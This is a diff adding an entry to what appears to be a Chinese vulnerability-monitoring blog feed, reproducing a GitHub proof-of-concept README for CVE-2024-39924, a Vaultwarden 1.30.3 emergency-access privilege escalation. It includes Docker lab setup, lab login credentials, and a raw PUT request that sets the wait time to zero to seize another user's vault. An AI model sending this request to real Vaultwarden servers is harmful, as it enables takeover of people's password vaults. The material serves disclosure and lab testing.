@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>Vaultwarden 权限提升漏洞</title>
+    <link href="/2025/06/02/github_1887450118/"/>
+    <url>/2025/06/02/github_1887450118/</url>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Vaultwarden 权限提升漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-39924</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在Vaultwarden（原Bitwarden_RS）1.30.3版本中发现了一个问题。该漏洞存在于修改紧急访问元数据的端点的认证和授权过程中。它允许具有紧急访问权限的攻击者通过更改访问级别和修改等待时间来提升其权限。因此，攻击者可以在绕过必要的等待时间的同时，获得对保险库的完全控制（当仅预期具有读取权限时）。</p><p><strong>产品厂商：</strong> Vaultwarden</p><p><strong>产品名称：</strong> Vaultwarden</p><p><strong>影响版本：</strong> 1.30.3</p><p><strong>来源：</strong> <a href="https://github.com/l4rm4nd/PoC-CVE-2024-39924">https://github.com/l4rm4nd/PoC-CVE-2024-39924</a></p><p><strong>类型：</strong> CVE-2024:github search</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># PoC-CVE-2024-39924<br>PoC and lab setup for CVE-2024-39924<br><br>## Description<br><br>An issue was discovered in Vaultwarden (formerly Bitwarden_RS) 1.30.3. A vulnerability has been identified in the authentication and authorization process of the endpoint responsible for altering the metadata of an emergency access. It permits an attacker with granted emergency access to escalate their privileges by changing the access level and modifying the wait time. Consequently, the attacker can gain full control over the vault (when only intended to have read access) while bypassing the necessary wait period.<br><br>## Lab Setup<br><br>Just build the docker image and run it:<br><br>\`\`\`\`<br># download repo<br>git clone https://github.com/l4rm4nd/PoC-CVE-2024-39924 &amp;&amp; cd PoC-CVE-2024-39924<br><br># build docker image<br>docker build -t CVE-2024-39924 .<br><br># run docker image<br>docker run --rm --name CVE-2024-39924 -p 443:80 CVE-2024-39924<br>\`\`\`\`<br><br>Then browse https://127.0.0.1 and pwn.<br><br>## Credentials<br><br>Two user accounts were configured within Vaultwarden.<br><br><span class="hljs-bullet">- </span>Susan with the e-mail address \`susan@wulport.com\`<br><span class="hljs-bullet">- </span>Robert with the e-mail address \`robert@wulport.com\`<br><br>Susan was configured as emergency contact for Robert. Robert chose an approval time of 90 days, which Susan wants to bypass.<br><br>You can login as Susan with the following creds:<br><br>\`\`\`\`<br>Username: susan@wulport.com<br>Password: Emission-darkened8-tr4itor<br>\`\`\`\`<br><br>## Exploitation<br><br>https://www.mgm-sp.com/cve/missing-authentication-check-for-emergency-access<br><br>Issue a PUT request to the API endpoint \`/api/emergency-access/&lt;UUID&gt;\` and manipulate the JSON key \`waitTimeDays\` to the value \`0\`. After 1 minute, a cronjob will provide Susan access to Robert&#x27;s vault.<br><br>&gt;[!CAUTION]<br>&gt; The cron interval was adjusted to make this PoC usable.<br>&gt;<br>&gt; The [default configuration](https://github.com/dani-garcia/vaultwarden/blob/51a1d641c5924779ac35fa69ae0eeb3369c1c6b7/.env.template#L160-L161) of Vaultwarden runs \`EMERGENCY_REQUEST_TIMEOUT_SCHEDULE\` hourly. So a real attacker would likely have to wait at least 1 hour to gain access to another person&#x27;s vault.<br><br>&lt;details&gt;<br><br>\`\`\`\`<br>PUT /api/emergency-access/127ed2a7-9225-499e-a6a7-70e96313a5db HTTP/1.1<br>Host: 127.0.0.1<br>Accept: <span class="hljs-strong">*/*</span><br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate, br<br>Referer: http://127.0.0.1/<br>authorization: Bearer &lt;redacted&gt;<br>device-type: 10<br>Cache-Control: no-store<br>Pragma: no-cache<br>Bitwarden-Client-Name: web<br>Bitwarden-Client-Version: 2024.1.2<br>Connection: keep-alive<br>Cookie: &lt;redacted&gt;<br><br><br>&#123;&quot;email&quot;:&quot;susan@wulport.com&quot;,&quot;type&quot;:0,&quot;waitTimeDays&quot;:0,&quot;Status&quot;:4&#125;<br>\`\`\`\`<br>&lt;/details&gt;<br></code></pre></td></tr></table></figure><pre><code class="hljs">- Dockerfile- README.md- src```</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc 监控</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>权限提升</tag>
+      
+      <tag>CVE-2024-39924</tag>
+      
+      <tag>CVE-2024:github search</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>WordPress suretriggers 权限绕过漏洞 (CVE-2025-3102) 附POC</title>
     <link href="/2025/06/02/weixin_3948685999/"/>
     <url>/2025/06/02/weixin_3948685999/</url>
